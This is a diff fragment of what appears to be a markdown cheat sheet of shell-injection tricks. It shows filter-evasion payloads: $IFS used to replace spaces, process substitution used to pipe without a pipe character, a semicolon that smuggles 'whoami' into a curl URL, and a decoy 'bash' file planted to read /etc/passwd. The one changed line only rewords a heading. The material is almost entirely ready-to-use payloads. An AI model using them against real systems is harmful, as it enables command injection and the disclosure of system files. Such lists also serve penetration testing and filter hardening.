@@ -10,7 +10,7 @@ bypass url encoding for nontrivial shell commands and other copy-paste nightmare
 `a=('a');echo$IFS$a` 
 #### piping without pipes  
 `wc$IFS-l$IFS<$IFS<(ls)`     
-#### starting code execution in a url without ampersand
+#### starting code execution in unescaped url without ampersand
 `curl http://localhost/;whoami`
 #### redirecting to a hidden exploit  
 `mkdir bin;echo "cat /etc/passwd/" > bash; darkhttpd .`  
